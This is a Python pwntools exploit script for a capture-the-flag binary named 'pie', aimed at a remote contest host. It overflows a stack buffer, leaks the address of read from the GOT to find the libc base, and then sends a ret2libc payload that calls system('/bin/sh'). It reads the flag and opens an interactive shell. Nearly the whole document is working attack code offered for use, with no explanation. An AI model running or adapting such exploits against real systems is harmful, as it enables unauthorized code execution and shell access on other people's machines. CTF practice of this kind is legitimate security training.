#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./pie"
#pwn_file="./level8-pieagain"
elf=ELF(pwn_file)
libc=ELF("./x32_libc-2.23.so")
#libc=ELF("./libc-2.23.so")

payload = 'a'* 0x28 + 'a'*4
write_addr = 0x7b2
start_func_addr = 0x863

i = 0x56600
while True:#i<0x57000:#True:
    i = 0x56555
    #i = 0x8048
    print hex(i)
    base_addr = i*0x1000
    ret_addr = base_addr + start_func_addr 

    pay = payload + p32(base_addr + write_addr) + p32(ret_addr) + p32(1)  + p32(base_addr + elf.got['read']) + p32(4)
    try:
      r=remote("pwn.sixstars.team",22008)
      #r = remote("10.132.141.60", 22008)
      #r = process("./level8-pieagain")
      r.recvuntil("name?\n")
      r.sendline("Stefan")
      r.recvuntil("again?\n")
      #r.recv()
      r.sendline(pay)
      try:
        print hex(elf.got['read'])
        read_addr = r.recv()
        print 'lalala'
        
        read_addr = read_addr[:4]
        # to process base_addr
        print "==========="
        print 'I have got the addr:'
        print read_addr
        read_addr = read_addr[::-1]
        read_addr = read_addr.encode('hex')
        read_addr = int(read_addr, 16)
        print hex(read_addr)
        libc.address = read_addr - libc.sym['read']
       
        #break
    
        sh_addr = list(libc.search("/bin/sh"))[0]
        system_addr = libc.sym['system']
        
        print 'libc addr is:'
        print hex(libc.address)

        #r.recv()
        r.sendline('Stefan_2')
        r.recvuntil("again?\n")

        pay2 = payload + p32(system_addr) + p32(0)+ p32(sh_addr)
        r.sendline(pay2)
        r.sendline('\n')
        r.sendline('cat flag')
        flag =r.recv()
        print flag
        r.interactive()
        break
      except:
        #i = i+1
        r.close()
        print 'addr_error'
        #break
    except:
        print 'connect_error'
